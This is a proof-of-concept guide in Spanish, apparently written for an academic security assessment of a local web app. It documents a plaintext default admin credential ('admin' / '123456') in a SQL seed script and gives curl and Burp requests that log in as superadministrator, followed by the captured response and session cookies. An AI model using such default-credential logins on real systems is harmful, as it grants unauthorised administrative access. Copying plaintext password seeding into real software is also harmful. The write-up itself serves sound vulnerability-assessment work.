# Guía de Prueba de Concepto: PoC-05 — Credencial de Administrador por Defecto en Texto Plano

**Vulnerabilidad:** H-02 — Credencial de Administrador en Texto Plano en `sql/datos_minimos.sql`  
**CWE:** CWE-259 (Use of Hard-coded Password) / CWE-521 (Weak Password Requirements)  
**OWASP Top 10:2021:** A07:2021 - Identification & Authentication Failures  
**Severidad:** Alta  
**Clasificación:** CONFIRMADO EN CÓDIGO  

---

## 1. Descripción Técnica del Fallo
En `sql/datos_minimos.sql:22-24`, el script que inicializa los datos mínimos del sistema inserta el usuario administrador con el nombre de usuario `'admin'` y la contraseña `'123456'` en texto plano (sin hash BCrypt). En conjunto con el bypass de `UsuarioServicioImpl.java:119-121` (que acepta contraseñas sin hash mediante comparación directa), cualquier atacante puede iniciar sesión inmediatamente como superadministrador con la credencial pública por defecto `admin / 123456`.

### Confirmación de Campos del Body en `AuthApiController.java`:
Revisando `AuthApiController.java` (líneas 60–73), el controlador soporta múltiples nombres de campo para compatibilidad con distintos formularios:
- **Identificador de usuario:** busca en orden `"correo"`, `"usuario"`, `"usuarioCorreo"`, `"email"` o `"login"`.
- **Contraseña:** busca en orden `"clave"`, `"contrasena"`, `"contraseña"` o `"password"`.
- **Validación de Portal:** `"rolEsperado": "ADMIN"` (o `"rol"`, `"portal"`).

Por tanto, son válidas tanto la sintaxis con `"usuario": "admin"` como con `"correo": "admin@travelink.pe"`.

---

## 2. Precondiciones
1. Base de datos inicializada con `sql/datos_minimos.sql` (usuario `admin`, idUsuario `1`, correo `admin@travelink.pe`, contraseña `'123456'`).
2. App local levantada en `http://127.0.0.1:8080`.

---

## 3. Procedimiento de Ejecución Manual (Request Exacta)

### Opción A: Usando el campo `"usuario"`
```bash
curl -i -s -X POST "http://127.0.0.1:8080/api/admin/login" \
     -H "Content-Type: application/json" \
     -d '{"usuario":"admin","clave":"123456","rolEsperado":"ADMIN"}'
```

### Opción B: Usando el campo `"correo"`
```bash
curl -i -s -X POST "http://127.0.0.1:8080/api/admin/login" \
     -H "Content-Type: application/json" \
     -d '{"correo":"admin@travelink.pe","clave":"123456","rolEsperado":"ADMIN"}'
```

### Formato para Burp Suite Repeater:
```http
POST /api/admin/login HTTP/1.1
Host: 127.0.0.1:8080
User-Agent: Mozilla/5.0
Content-Type: application/json
Accept: application/json
Content-Length: 59
Connection: close

{"usuario":"admin","clave":"123456","rolEsperado":"ADMIN"}
```

---

## 4. Respuesta Esperada
- **Código de Estado HTTP:** `200 OK`
- **Cabeceras:** `Set-Cookie: JSESSIONID=...; Path=/; HttpOnly`
- **Cuerpo de Respuesta (JSON):**
  ```json
  {
    "idUsuario": 1,
    "nombre": "Administrador Travelink Sistema",
    "correo": "admin@travelink.pe",
    "rol": "ROLE_ADMIN",
    "idAgencia": null
  }
  ```
- **Análisis de Seguridad:** El sistema concede una sesión de Administrador General (`ROLE_ADMIN`) utilizando la contraseña débil `'123456'` que se encontraba almacenada sin cifrar en la base de datos.

---

## 5. Qué Capturar para el Informe Académico
1. **Burp / Terminal:** Captura del inicio de sesión con `admin / 123456` devolviendo `HTTP 200 OK` con rol `ROLE_ADMIN` y la cookie `JSESSIONID`.
2. **Editor de Código:** Captura de `sql/datos_minimos.sql` en las líneas 22-24 mostrando la sentencia SQL `VALUES (1, 1, 3, 'admin', '123456', 'ACTIVO')`.
3. **Navegador Web:** Acceso a `http://127.0.0.1:8080/html/administrador/admin.html` utilizando la cookie obtenida, mostrando el panel de control administrativo activo.

---

## 6. Resultado Real (Completar tras la prueba)
Salida HTTP real iniciando sesión con la credencial administrativa por defecto en texto plano (`adminlogin.json`: `{"usuario":"admin","clave":"123456"}`):

### `curl.exe -i -s -X POST "http://127.0.0.1:8080/api/auth/login" -H "Content-Type: application/json" -d "@adminlogin.json"`
```http
HTTP/1.1 200 
Vary: origin,access-control-request-method,access-control-request-headers,accept-encoding
Set-Cookie: XSRF-TOKEN=828629da-6afc-464d-9ac3-8122e92edb99; Path=/
Set-Cookie: JSESSIONID=E0DC2969CEF798519E6348FBB77641CE; Path=/; HttpOnly; SameSite=Lax
X-Content-Type-Options: nosniff
X-XSS-Protection: 0
X-Frame-Options: SAMEORIGIN
Content-Type: application/json;charset=UTF-8
Transfer-Encoding: chunked
Date: Wed, 11 Nov 2026 22:13:31 GMT

{"idUsuario":1,"nombre":"Administrador Travelink Sistema","correo":"admin@travelink.pe","rol":"ROLE_ADMIN","status":"success","user":{"apellidos":"Travelink Sistema","apellidoPaterno":"Travelink","idRol":3,"idUsuario":1,"correo":"admin@travelink.pe","telefono":"999888777","nombre":"Administrador Travelink Sistema","nroDocumento":"00000001","email":"admin@travelink.pe","rol":"ROLE_ADMIN","nombres":"Administrador","apellidoMaterno":"Sistema"},"nombres":"Administrador","apellidoPaterno":"Travelink","apellidoMaterno":"Sistema","nroDocumento":"00000001","telefono":"999888777","apellidos":"Travelink Sistema"}
```
